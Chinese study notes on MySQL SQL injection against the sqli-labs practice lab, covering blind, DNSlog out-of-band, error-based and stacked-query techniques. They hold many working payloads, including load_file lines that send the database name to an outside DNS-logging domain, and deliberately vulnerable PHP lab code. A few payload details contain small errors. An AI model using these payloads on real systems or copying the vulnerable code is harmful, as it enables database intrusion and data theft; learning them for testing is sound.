## 3.盲注
> 在传统的SQL注入攻击中，攻击者可以直接获取到应用程序返回的数据库错误信息或查询结果，从而了解到他们所注入的恶意SQL语句是否生效。 **但在盲注（Blind）注入中，攻击者无法直接获取到这些信息，因此称之为"盲注"。**
> 
> 在盲注攻击中，攻击者通过构造恶意的注入语句，将其输入传递给应用程序处理。然后，攻击者观察应用程序的响应或其他可见的行为来确定注入是否成功，并进一步探测和利用数据库中的数据。

### 时间盲注
> 攻击者在注入语句中使用延时函数或计算耗时操作，以`观察应用程序对恶意查询的处理时间`。通过观察响应时间的变化，攻击者可以逐渐推断数据库中的数据。**页面不会返回任何报错信息** 
> 基于时间的盲注通常会使用一些可能引起延迟或错误的操作，如`睡眠函数sleep()、错误的 SQL 语句或其他耗时的操作。`

### dnslog盲注（光速盲注）
> DNSlog注入是一种利用DNS服务器记录域名解析请求的特性，来获取SQL注入结果的技术。它的原理是通过构造一个包含数据库信息的子域名，然后使用MySQL的load_file函数或其他方法，让目标服务器向DNS服务器发起解析请求，从而在DNS服务器上留下注入结果的痕迹。利用带外通道将数据带出，可以减少发送请求，直接回显数据实现注入。
> DNSlog注入的应用场景是当网站对于SQL注入的攻击没有回显或者过滤了敏感的回显内容时，可以使用DNSlog注入来绕过这些限制，获取数据库的信息。

#### 前提条件
- 网站根目录配置文件`my.ini`中参数`secure_file_priv= `  为空(允许去读取执行的路径，如果参数为空，就是所有都可以，指定具体路径的话，就只能操作指定路径)
- 必须是windows操作系统
#### DNSlog
DNSlog网站：
	`dnslog.cn`
	`eyes.sh`
在相关网站上面创建专属子域名后，可在该相关网站上面查看到相关记录
#### UNC
windows系统用于映射网络驱动器（共享文件夹）
win+R打开，输入，会触发dns解析
`\\ip`
#### SQL注入读取文件函数
- `load_file()`读取文件函数
- `select load_file('E:\\1.txt')`读取对应路径的文件
- `concat('//',(select database()),'.dnslogyuming/abc')`
	- 得出：`//database.dnslogyuming/abc`类UNC路径
- `load_file(concat('//',(select database()),'.dnslogyuming/abc'))`
	- 通过concat函数进行拼接，结果是一个类似于UNC路径（域名）一样的东西，当我们通过load_file进行文件读取时，因为拼接的结果是unc，就会去访问对应地址，而又因为访问的地址里面有自己的dnslog，就会将访问结果进行记录
![](assets/19.SQL注入利用方式/file-20260326151512266.png)
- `if ((select load_file(concat('//',(select database()),'.zhuxingliangchen.eyes.sh/abc'))),1,0)--+`
- 通过此查询将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录，姿势变为显错注入，读取远程共享文件，通过拼接的函数做查询，拼接到域名中，访问时将访问服务器，记录后查看域名
#### 多种写法
推荐第3种写法：部分情况下要查询的数据有特殊字符，可能会出现域名与特殊字符进行了拼接，就会造成无法构建正常域名
```SQL
if ((select load_file(concat('//',(select database()),'.zhuxingliangchen.eyes.sh/abc'))),1,0)--+
if ((select load_file(concat('\\\\',(select database()),'.zhuxingliangchen.eyes.sh/abc'))),1,0)--+
if ((select load_file(concat('//',(select hex(database())),'.zhuxingliangchen.eyes.sh/abc'))),1,0)--+ 
#使用16进制 获取的是数据库名的16进制表示
```

## 4.报错注入
> 当语句发生错误时，错误信息被输出到前端。其漏洞原因是由于开发人员在开发程序时使用了print_r ()，mysql_error()，mysqli_connect_error()函数将mysql错误信息输出到前端，因此攻击者可以利用这些错误信息进行人为的制造错误条件，去代入数据库执行恶意语句并在前端进行显示。
> 总共有12种，常用有三，floor、updatexml、extractvalue

### 1.floor报错注入
主键报错
**通用格式：**(`concat()`中sql语句的可替换)
- 查库名`?id=1' and (select 1 from (select count(*),concat((database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+`
- 查表名`?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.table where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+`
- 查字段名`?id=1' and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name='user' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+`
- 获取数据`?id=1' and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+`
### 2.updatexml报错注入

- `updatexml(参数1,参数2,参数3)` 是一个使用不同的xml标记匹配和替换xml块的函数
	- 作用：改变文档中符合条件的节点的值
		- 参数一：需要替换的值
		- 参数二：替换的文件路径，如果存在特殊符号，就会报错
			- `select updatexml(1,'',1)`会报错，参数不符合要求
		- 参数三：替换的内容
	- 通过`concatenate()`函数将参数二中放入能执行的特殊sql语句，观看报错来获取需要的信息
		- `?id=1' and updatexml(1,concat('~',(select database())),3)--+`获取数据库名
		- `?id=1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema=database() limit 1,1)),3)--+`获取表名
		- `?id=1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)),3)--+`获取列名
		-  `?id=1' and updatexml(1,concat('~',(select username from users limit 0,1)),3)--+`获取数据·
### 3.extractvalue报错注入
- `extractvalue(参数1,参数2)`
	- 作用：从目标XML中返回包含所查询值的字符串
		- 参数一：目标xml文件
		- 参数二：目标xml文件路径，如果不是路径形式，就会报错（只要是路径形式无论是否真实存在都不会报错）
			- `select extractvalue('','~~~')`会报错，参数不符合要求
	- 通过`concatenate()`函数将参数二中放入能执行的特殊sql语句，观看报错来获取需要的信息
		- `?id=1' and extractvalue(1,concat('~',(select database())))--+`获取数据库名
		- `?id=1' and extractvalue(1,concat(1,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--+`获取表名
		- `?id=1' and extractvalue(1,concat('~',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--+`获取字段名
		- `?id=1' and extractvalue(1,concat('~',(select username from users limit 0,1)))--+`获取数据

## 5.堆叠注入
> 把许多语句堆叠注入
> 利用 SQL 语法中的分号 `;` 分隔符，**同时执行多条独立的 SQL 语句**。
> 区别于普通注入只能进行查询，堆叠注入只要权限够，能进行增删查改任意操作
> 限制较多，使用条件严苛

php函数`mysql_multi_query()`
java函数 `Statement.execute()`
python函数 `cursor.executescript()`
支持多条sql语句同时执行，中间使用`;`进行分隔
靶场：sqli/Less-38
```php
<?php
// 关闭错误报告
error_reporting(0);
// 引入数据库配置文件
include("../sql-connections/db-creds.inc");

// 检测是否传入id参数
if(isset($_GET['id'])){
    $id = $_GET['id'];
    
    // 日志记录：将传入的ID写入result.txt
    $fp = fopen('result.txt','a');
    fwrite($fp,'ID:'.$id."\n");
    fclose($fp);

    // 连接MySQL数据库
    $con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
    
    // 检测数据库连接是否失败
    if (mysqli_connect_errno($con1)){
        echo "Failed to connect to MySQL: " . mysqli_connect_error();
    }else{
        // 选择数据库
        @mysqli_select_db($con1, $dbname) or die("Unable to connect to the database: $dbname");
    }

    // 拼接SQL语句（核心：堆叠查询注入点）
    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

    // 执行多语句查询（mysqli_multi_query 支持堆叠查询）
    if (mysqli_multi_query($con1, $sql)){
        // 获取第一条查询结果
        if ($result = mysqli_store_result($con1)){
            if($row = mysqli_fetch_row($result)){
                // 输出用户名和密码
                printf("Your Username is : %s", $row[1]);
                echo "\n";
                printf("Your Password is : %s", $row[2]);
                echo "\n";
            }
        }
        // 检测是否存在更多结果
        mysqli_more_results($con1);
    }else{
        // 输出SQL执行错误
        print_r(mysqli_error($con1));
    }

    // 关闭数据库连接
    mysqli_close($con1);
}else{
    // 未传入id参数的提示
    echo "Please input the ID as parameter with numeric value";
}
?>
```
- 判断闭合
- 构建语句`?id=1';sql语句`
	- 获取数据库名
	- 获取表名
	- 获取字段名
	- 获取数据
- 获取库、表、字段名后进行增删查改

`mysql_escape_string()`PHP函数
- 转义 SQL 语句中使用的字符串中的特殊字符
	- 不使用该函数的话`' and 1=1`会被识别进行sql注入
	- 使用后会被识别为`/' and 1=1`，会存入数据库充当数据，存进去的仍为`' and 1=1`
	- 转义后无法在代码执行进行sql注入，但是会将恶意数据存入数据库
